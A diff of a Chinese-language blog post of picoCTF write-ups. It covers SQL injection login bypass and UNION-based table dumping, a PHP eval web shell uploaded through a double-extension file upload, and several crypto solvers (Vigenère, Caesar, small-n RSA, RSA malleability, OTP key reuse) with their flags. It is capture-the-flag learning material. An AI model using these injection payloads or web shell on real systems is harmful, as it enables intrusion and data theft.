@@ -1,17 +1,23 @@
 ---
 title: All-in-One PicoCTF Writeups
 date: 2024-06-01 10:27:03
-categories: 
-- [CyberSec, CTF]
+categories:
+    - [CyberSec, CTF]
 mathjax: true
 thumbnail: https://hackmd.io/_uploads/BJxhDLKL0.png
 ---
+
 # 前言
-其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言XD。總之呢這裡就是會盡量彙整所有的picoCTF的題目在這邊（但是因為已經寫了60題左右才開始打算來寫writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的writeup，就這樣啦！希望能幫忙到你。
+
+其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題左右才開始打算來寫 writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的 writeup，就這樣啦！希望能幫忙到你。
+
 # Web
+
 ## picobrowser
-這題我們點進URL後會看到一個FLAG的按鈕，按下去會發現我們不能得到FLAG。![image](https://hackmd.io/_uploads/SJB9S0p70.png)
-他說我們應該要是picobrowser，所以我就寫了一個selenium的Python腳本來運行，看看能不能拿到flag。
+
+這題我們點進 URL 後會看到一個 FLAG 的按鈕，按下去會發現我們不能得到 FLAG。![image](https://hackmd.io/_uploads/SJB9S0p70.png)
+他說我們應該要是 picobrowser，所以我就寫了一個 selenium 的 Python 腳本來運行，看看能不能拿到 flag。
+
 ```python=
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
@@ -29,12 +35,16 @@ url = "https://jupiter.challenges.picoctf.org/problem/28921/flag"
 driver.get(url)
 time.sleep(1337)
 ```
-這樣就得到flag了！
+
+這樣就得到 flag 了！
+
 ```
 picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
 ```
+
 ## More SQLi
-把題目launch了之後會進入到一個登入頁面，如下圖。
+
+把題目 launch 了之後會進入到一個登入頁面，如下圖。
 
 ![題目](https://hackmd.io/_uploads/BySNOmYUC.png)
 
@@ -43,54 +53,67 @@ picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
 ![image](https://hackmd.io/_uploads/r1wnu7KIR.png)
 
 圖片有點小，總之他顯示的內容就是像下面這樣:
+
 ```
 username: admin
 password: admin
 SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
 ```
-所以我們在這邊把密碼用`'OR 1=1 --`這串payload作為輸入（帳號可以隨便輸入），整個SQL的query就會變成這樣:
+
+所以我們在這邊把密碼用`'OR 1=1 --`這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:
+
 ```sql=
 SELECT id FROM users WHERE password = ''OR 1=1 --' AND username = 'admin'
 ```
+
 可以從上面的代碼高亮的顏色發現，在`1=1`後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:
 
 ![image](https://hackmd.io/_uploads/rJjw6XYUC.png)
 
-他可以查詢City的名稱，但其實一筆資料包含了City, Address, Phone。分析一下後台可能的SQL語句，應該是如下:
+他可以查詢 City 的名稱，但其實一筆資料包含了 City, Address, Phone。分析一下後台可能的 SQL 語句，應該是如下:
+
 ```sql=
 SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '';
 ```
-再來因為題目有告訴我們系統使用的是SQLite，所以會有一個叫做`sqlite_master`的表來儲存一些表格的各種資訊。（[資訊來源](https://blog.csdn.net/luoshabugui/article/details/108327936)）
 
-知道這些候我們輸入`' UNION SELECT name, sql, 1337 FROM sqlite_master; --`讓整個SQL語句變成如下
+再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做`sqlite_master`的表來儲存一些表格的各種資訊。（[資訊來源](https://blog.csdn.net/luoshabugui/article/details/108327936)）
+
+知道這些候我們輸入`' UNION SELECT name, sql, 1337 FROM sqlite_master; --`讓整個 SQL 語句變成如下
+
 ```sql=
 SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '' UNION SELECT name, sql, 1337 FROM sqlite_master; --';
 ```
-這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是sqlite_master的表格內容，如下:
+
+這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是 sqlite_master 的表格內容，如下:
 
 ![image](https://hackmd.io/_uploads/BysgmNY8R.png)
 
-我們可以看到被紅色框框圈住的地方就是我們所想獲得的flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段payload`' UNION SELECT 1, flag, 1 FROM more_table; --`。輸入後就可以看到以下的介面啦！
+我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload`' UNION SELECT 1, flag, 1 FROM more_table; --`。輸入後就可以看到以下的介面啦！
 
 ![image](https://hackmd.io/_uploads/SyoSNNtLA.png)
 
-flag就找到囉！
+flag 就找到囉！
+
 ```
 picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
 ```
 
 ## Trickster
-這題的題目是一個可以上傳png的網頁，看起來就是文件上船漏洞，頁面如下:
+
+這題的題目是一個可以上傳 png 的網頁，看起來就是文件上船漏洞，頁面如下:
 
 ![題目](https://hackmd.io/_uploads/HkocKNtIA.png)
 
-~~秉持著不知道要幹嘛的時候先掃路徑的精神~~，可以找到它的robots.txt，它其中禁止了兩個路徑，如下:
+~~秉持著不知道要幹嘛的時候先掃路徑的精神~~，可以找到它的 robots.txt，它其中禁止了兩個路徑，如下:
+
 ```
 User-agent: *
 Disallow: /instructions.txt
 Disallow: /uploads/
 ```
-既然它都禁止了，我們就去看看吧XD。`/uploads/`應該就是它的上船後的文件路徑了，而它instructions.txt的內容如下:
+
+既然它都禁止了，我們就去看看吧 XD。`/uploads/`應該就是它的上船後的文件路徑了，而它 instructions.txt 的內容如下:
+
 ```
 Let's create a web app for PNG Images processing.
 It needs to:
@@ -99,48 +122,58 @@ Allow users to upload PNG images
 	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
 after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
 ```
-所以我們知道後端驗證檔案是否為png的方法有二，其一為檢查文件後綴名是否為`.png`；其二為驗證文件的magic bytes，看文件在十六進制中的前幾個位元組是否為`50 4E 47`。
 
-知道了這些信息後，我們先隨便找一張png圖片上傳看看吧！（我這邊直接隨便截圖，並命名為`hack.png`）。並且在upload的過程中用Burp suite去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為`hack.png.php`，並在檔案內容的PNG以下添加這個[php一句話木馬](https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)
+所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為`.png`；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為`50 4E 47`。
+
+知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為`hack.png`）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為`hack.png.php`，並在檔案內容的 PNG 以下添加這個[php 一句話木馬](https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)
+
 ```php=
 <?php @eval($_POST['shell']);?>
 ```
+
 整個修改完後如下（點開來看可能會比較清楚）:
 
 ![image](https://hackmd.io/_uploads/Sy7rFrYU0.png)
 
-上傳完成後，現在這個shell就會位於`https://my_instance_url/uploads/hack.png.php`這個位置上啦。
+上傳完成後，現在這個 shell 就會位於`https://my_instance_url/uploads/hack.png.php`這個位置上啦。
 
-接下來再用[中國蟻劍](https://github.com/AntSwordProject/antSword)這款工具去連接那個web shell就可以啦，連接過程如下:
+接下來再用[中國蟻劍](https://github.com/AntSwordProject/antSword)這款工具去連接那個 web shell 就可以啦，連接過程如下:
 
 ![輸入連接資訊](https://hackmd.io/_uploads/HJo4cSF8A.png)
 
-連接完成後，就可以直接看一下網站的文件，看到以下這個`.txt`應該就是flag了。
+連接完成後，就可以直接看一下網站的文件，看到以下這個`.txt`應該就是 flag 了。
 
 ![貌似是flag的文件](https://hackmd.io/_uploads/SyahqSYLR.png)
 
 ![flag出來了](https://hackmd.io/_uploads/HJW1sBtI0.png)
 
-於是我們就成功找到了flag啦！如下:
+於是我們就成功找到了 flag 啦！如下:
+
 ```
 picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
 ```
-這邊補充一個知識點，來講一下`<?php @eval($_POST['shell']);?>`到底是在做啥。但因為我也不是很熟php，所以我們來看看ChatGPT大神是怎麼回答的吧！
->當然，這段PHP代碼的原理是允許遠程執行伺服器上的PHP代碼。這是如何工作的：
->1. `<?php` 是PHP代碼的開始標記。
->2. `@eval($_POST['shell']);` 中的 `eval()` 函數執行傳遞給它的字符串作為PHP代碼。這裡的代碼來自於HTTP POST請求中名為 `shell` 的變量。
->3. `@` 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。
->4. 由於這段代碼執行任意PHP代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。
->
->簡言之，任何通過 `shell` 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。
 
-然後我後來找到了另一篇writeup，它的payload比較酷，是一個即時執行的input框，有興趣可以去看一下[這篇](https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18)。
+這邊補充一個知識點，來講一下`<?php @eval($_POST['shell']);?>`到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！
+
+> 當然，這段 PHP 代碼的原理是允許遠程執行伺服器上的 PHP 代碼。這是如何工作的：
+>
+> 1.  `<?php` 是 PHP 代碼的開始標記。
+> 2.  `@eval($_POST['shell']);` 中的 `eval()` 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 `shell` 的變量。
+> 3.  `@` 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。
+> 4.  由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。
+>
+> 簡言之，任何通過 `shell` 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。
+
+然後我後來找到了另一篇 writeup，它的 payload 比較酷，是一個即時執行的 input 框，有興趣可以去看一下[這篇](https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18)。
 
 # Crypto
->[My scripts & note on Github](https://github.com/CX330Blake/Crypto_Notebook)
+
+> [My scripts & note on Github](https://github.com/CX330Blake/Crypto_Notebook)
+
 ## Easy1
+
 ```
-    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 
+    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
    +----------------------------------------------------
 A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
 B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A
@@ -169,11 +202,13 @@ X | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W
 Y | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X
 Z | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y
 
-Cipher: UFJKXQZQUNB 
+Cipher: UFJKXQZQUNB
 Key: SOLVECRYPTO
 ```
+
 這題是一個維吉尼亞密碼。維吉尼亞密碼（法語：Chiffre de Vigenère，又譯維熱納爾密碼）是使用一系列凱撒密碼組成密碼字母表的加密算法，屬於多表密碼的一種簡單形式。[維基百科](https://zh.wikipedia.org/zh-tw/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81)
-解密的方式也很簡單，最上面一列是明文，最左邊那行是KEY，這樣對應起來中間的字元就是密文。知道了這個之後回推回去就可以得到明文。
+解密的方式也很簡單，最上面一列是明文，最左邊那行是 KEY，這樣對應起來中間的字元就是密文。知道了這個之後回推回去就可以得到明文。
+
 ```python=
 cipher = "UFJKXQZQUNB"
 key = "SOLVECRYPTO"
@@ -189,16 +224,23 @@ for i in range(len(cipher)):
 
 print(f"Message: {pt}")
 ```
-而最後的flag如下
+
+而最後的 flag 如下
+
 ```
 picoCTF{CRYPTOISFUN}
 ```
+
 ## Caesar
-如同題目所說，這題就是個基本的凱薩加密。題目給了加密過的flag
+
+如同題目所說，這題就是個基本的凱薩加密。題目給了加密過的 flag
+
 ```
 picoCTF{gvswwmrkxlivyfmgsrhnrisegl}
 ```
+
 就把裡面那串拿去解密，因為不知道偏移量是多少，所以就暴力破解。
+
 ```python=
 cipher = "gvswwmrkxlivyfmgsrhnrisegl"
 
@@ -214,15 +256,21 @@ for i in range(26):
     plaintext = caesar_cipher(cipher, i)
     print(f"Shift {i}: {plaintext}")
 ```
-跑出來的結果中，看起來是`crossingtherubicondjneoach`最合理，所以這就是flag了
+
+跑出來的結果中，看起來是`crossingtherubicondjneoach`最合理，所以這就是 flag 了
+
 ```
 picoCTF{crossingtherubicondjneoach}
 ```
+
 ## New Caesar
-題目給了一個密文和一個Python腳本。
+
+題目給了一個密文和一個 Python 腳本。
+
 ```
 apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna
 ```
+
 ```python=
 import string
 
@@ -253,21 +301,25 @@ for i, c in enumerate(b16):
 	enc += shift(c, key[i % len(key)])
 print(enc)
 ```
-先觀察這個加密腳本。發現他是把明文每個字母的Ascii值轉為Binary後，從左邊補0補到8個Bits，然後
+
+先觀察這個加密腳本。發現他是把明文每個字母的 Ascii 值轉為 Binary 後，從左邊補 0 補到 8 個 Bits，然後
+
 ## Mind your Ps and Qs
-這題是個RSA加密，先來複習一下RSA加密裡面的各個參數。
+
+這題是個 RSA 加密，先來複習一下 RSA 加密裡面的各個參數。
 :::info
 Find two prime numbers p & q
-n = p * q 
-phi(n) = (p-1) * (q-1)
+n = p _ q
+phi(n) = (p-1) _ (q-1)
 e is the encryption exponent
 d = e^-1 mod phi(n)
 c is the encrypted message; c = m^e mod n
 m is the message; m = c^d mod n
-Public key  = (e, n)
+Public key = (e, n)
 Private key = (d, n)
 :::
 複習完後，看一下題目的說明。
+
 ```
 Description:
 In RSA, a small e value can be problematic, but what about N? Can you decrypt this?
@@ -277,11 +329,13 @@ c: 42134530629204066386406668893145684527849627459703163202099558347361980462623
 n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637
 e: 65537
 ```
-這題的敘述中告訴我們，當e太小的時候我們可以使用小公鑰指數攻擊(Low public exponent attack)，而題目要我們思考當N太小的時候我們可以如何利用。
 
-回去看一下RSA加密的流程後，我們發現N是兩個質數的乘積，而當N太小的時候我們就可以暴力破解出兩個P跟Q。這裡我們直接使用FactorDB去找N的因數，就可以找到P和Q了。
+這題的敘述中告訴我們，當 e 太小的時候我們可以使用小公鑰指數攻擊(Low public exponent attack)，而題目要我們思考當 N 太小的時候我們可以如何利用。
 
-而有了P和Q，我們就可以順著RSA流程找到明文M了，我寫了個Python幫我找出明文，如下
+回去看一下 RSA 加密的流程後，我們發現 N 是兩個質數的乘積，而當 N 太小的時候我們就可以暴力破解出兩個 P 跟 Q。這裡我們直接使用 FactorDB 去找 N 的因數，就可以找到 P 和 Q 了。
+
+而有了 P 和 Q，我們就可以順著 RSA 流程找到明文 M 了，我寫了個 Python 幫我找出明文，如下
+
 ```python=
 from Crypto.Util.number import inverse, long_to_bytes
 from factordb.factordb import FactorDB
@@ -309,26 +363,35 @@ print(f"Private key: d = {d}")
 m = pow(c, d, n)
 print(f"Decrypted message: m = {long2str(m)}")
 ```
-最後找到的明文會是一個很大的數字，這時候再用Crypto.Util.number的long_to_bytes並decode，將其轉為字符串，就可以得到flag了。
+
+最後找到的明文會是一個很大的數字，這時候再用 Crypto.Util.number 的 long_to_bytes 並 decode，將其轉為字符串，就可以得到 flag 了。
+
 ```
 picoCTF{sma11_N_n0_g0od_55304594}
 ```
 
 ## No padding, no problem
+
 > 可以先看過這篇 [Day 14:[離散數學]同餘（Mod）是什麼？](https://ithelp.ithome.com.tw/articles/10205727)
 
-當我們把題目給的密文拿去解密，他會說`Will not decrypt the ciphertext. Try Again`。代表題目的這支程式應該是在偵測我們輸入的是否為Ciphertext。而我們知道
+當我們把題目給的密文拿去解密，他會說`Will not decrypt the ciphertext. Try Again`。代表題目的這支程式應該是在偵測我們輸入的是否為 Ciphertext。而我們知道
+
 $$
-Plaintext = c^d \mod n 
+Plaintext = c^d \mod n
 $$
+
 $$
 c^d \mod n = (c+n)^d \mod n
 $$
-所以我們利用題目給的c和n相加後，輸入到他的程式會得到:
+
+所以我們利用題目給的 c 和 n 相加後，輸入到他的程式會得到:
+
 ```
 Here you go: 290275030195850039473456618367455885069965748851278076756743720446703314517401359267322769037469251445384426639837648598397
 ```
-接著只要再利用Crypto的long_to_bytes3方法就可以找到明文，如下:
+
+接著只要再利用 Crypto 的 long_to_bytes3 方法就可以找到明文，如下:
+
 ```python=
 from Crypto.Util.number import long_to_bytes
 from pwn import *
@@ -346,13 +409,17 @@ r.close()
 
 print(long_to_bytes(m))
 ```
+
 ```
 picoCTF{m4yb3_Th0se_m3s54g3s_4r3_difurrent_1772735}
 ```
+
 ## Easy peasy
-> 想了解OTP可以去看看這個 [一次性密碼本](https://zh.wikipedia.org/zh-tw/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC)
+
+> 想了解 OTP 可以去看看這個 [一次性密碼本](https://zh.wikipedia.org/zh-tw/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC)
 
 先看題目。
+
 ```
 ******************Welcome to our OTP implementation!******************
 This is the encrypted flag!
@@ -360,7 +427,9 @@ This is the encrypted flag!
 
 What data would you like to encrypt?
 ```
-在這題中，我們要先閱讀他給我們的Code。在encrypt函式中我們可以看到一些事情。因為題目給的Cipher的長度為64，又因為他是以十六進制的方式輸出Cipher，所以我們可以知道他用掉的`key_location`長度為32，也就是說，我們下次在加密的時候是用第33位開始的key。
+
+在這題中，我們要先閱讀他給我們的 Code。在 encrypt 函式中我們可以看到一些事情。因為題目給的 Cipher 的長度為 64，又因為他是以十六進制的方式輸出 Cipher，所以我們可以知道他用掉的`key_location`長度為 32，也就是說，我們下次在加密的時候是用第 33 位開始的 key。
+
 ```pytho=
 def encrypt(key_location):
     ui = input("What data would you like to encrypt? ").rstrip()
@@ -385,16 +454,21 @@ def encrypt(key_location):
 
     return key_location
 ```
-知道了我們第一次輸入要加密的銘文是從第32個key開始後，我們要想辦法可以使用到跟題目一樣的那組key，而在程式碼的這個區段我們可以發現一些事。
+
+知道了我們第一次輸入要加密的銘文是從第 32 個 key 開始後，我們要想辦法可以使用到跟題目一樣的那組 key，而在程式碼的這個區段我們可以發現一些事。
+
 ```python=
 if stop >= KEY_LEN:
         stop = stop % KEY_LEN
         key = kf[start:] + kf[:stop]
 ```
-在這邊，如果我們讓`stop`和`KEY_LEN`相等，讓`stop % KEY_LEN == 0`的話，`stop`就會被設定為0，所以我們就可以讓one-time pad被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個50000循環結束，再進入一次循環後我們就可以得到跟題目一樣的key了。
 
-然後因為他加密的方法是用計算XOR的方式，所以我們可以簡單地透過再計算一次XOR得到明文，如下:
+在這邊，如果我們讓`stop`和`KEY_LEN`相等，讓`stop % KEY_LEN == 0`的話，`stop`就會被設定為 0，所以我們就可以讓 one-time pad 被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個 50000 循環結束，再進入一次循環後我們就可以得到跟題目一樣的 key 了。
+
+然後因為他加密的方法是用計算 XOR 的方式，所以我們可以簡單地透過再計算一次 XOR 得到明文，如下:
+
 > $$key \oplus pt = ct$$ $$key \oplus ct = pt$$ $$pt \oplus ct = key$$
+
 ```python=
 from pwn import *
 import binascii  # binascii.unhexlify() is used to convert hex to binary
@@ -432,7 +506,11 @@ flag = "".join(flag)
 print(flag)
 
 ```
-# Pwn 
+
+# Pwn
+
 # Forensic
+
 # Reverse
+
 # Misc
